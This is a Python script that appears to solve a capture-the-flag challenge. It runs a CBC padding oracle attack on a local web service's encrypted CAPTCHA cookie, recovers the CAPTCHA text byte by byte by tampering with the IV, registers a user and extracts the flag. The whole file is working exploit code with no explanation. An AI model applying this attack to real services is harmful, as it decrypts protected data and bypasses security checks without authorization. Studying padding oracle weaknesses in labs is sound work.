import requests
import base64
import re

URL = "http://127.0.0.1:32869/"

print("[*] Step 1: Fetch fresh session")
r = requests.get(URL, timeout=5)
captcha_b64 = r.cookies.get('captcha')
session = r.cookies.get('session')
csrf = re.search(r'name="csrf_token"[^>]*value="([^"]+)"', r.text).group(1)

captcha_bytes = base64.b64decode(captcha_b64)
print(f"[+] Captcha hex: {captcha_bytes.hex()}")
print(f"[+] Length: {len(captcha_bytes)}")

iv = captcha_bytes[:16]
ct = captcha_bytes[16:]

print(f"[+] IV: {iv.hex()}")
print(f"[+] CT: {ct.hex()}")

# Create session for connection reuse
s = requests.Session()

def test(modified_iv):
    """Quick oracle test."""
    full = base64.b64encode(modified_iv + ct).decode()
    try:
        resp = s.post(
            URL,
            data={'username': 'a', 'captcha': 'a', 'csrf_token': 'a', 'submit': 'Register'},
            cookies={'session': session, 'captcha': full},
            timeout=2
        )
        return len(resp.content)
    except:
        return -1

print("\n[*] Step 2: Padding oracle attack")
plaintext = bytearray(16)
intermediate = bytearray(16)

baseline = test(iv)
print(f"[+] Baseline length: {baseline}")

for pad in range(1, 17):
    pos = 16 - pad
    print(f"\n[*] Decrypting byte {pos}...")
    
    test_iv = bytearray(iv)
    for k in range(1, pad):
        test_iv[16-k] = intermediate[16-k] ^ pad
    
    found = False
    # Prioritize padding values
    check_order = list(range(1, 17)) + [i for i in range(256) if i not in range(1, 17)]
    
    for g in check_order:
        test_iv[pos] = g
        length = test(bytes(test_iv))
        
        if length != baseline and length > 0:
            intermediate[pos] = g ^ pad
            plaintext[pos] = intermediate[pos] ^ iv[pos]
            c = chr(plaintext[pos]) if 32 <= plaintext[pos] < 127 else '.'
            print(f"[+] Byte {pos}: 0x{plaintext[pos]:02x} '{c}'")
            found = True
            break
    
    if not found:
        plaintext[pos] = pad
        intermediate[pos] = iv[pos] ^ pad
        print(f"[*] Fallback byte {pos}: 0x{plaintext[pos]:02x}")

print(f"\n[+] Plaintext (hex): {bytes(plaintext).hex()}")
print(f"[+] Plaintext (raw): {bytes(plaintext)}")

# Remove PKCS7 padding
pad_val = plaintext[-1]
if 1 <= pad_val <= 16 and all(plaintext[-(i+1)] == pad_val for i in range(pad_val)):
    solution = bytes(plaintext[:-pad_val])
else:
    solution = bytes(plaintext)

solution_str = solution.decode('utf-8', errors='ignore')
print(f"[+] CAPTCHA solution: '{solution_str}'")

print("\n[*] Step 3: Register user")
reg_data = {
    'username': 'hacker123',
    'captcha': solution_str,
    'csrf_token': csrf,
    'submit': 'Register'
}
reg_cookies = {'session': session, 'captcha': captcha_b64}

reg_resp = s.post(URL, data=reg_data, cookies=reg_cookies, timeout=5)
print(f"[+] Status: {reg_resp.status_code}")
print(f"\n[+] Response:\n{reg_resp.text}")

flag_match = re.search(r'FLAG\{[^}]+\}', reg_resp.text)
if flag_match:
    print(f"\n{'='*60}")
    print(f"FLAG FOUND: {flag_match.group(0)}")
    print(f"{'='*60}")

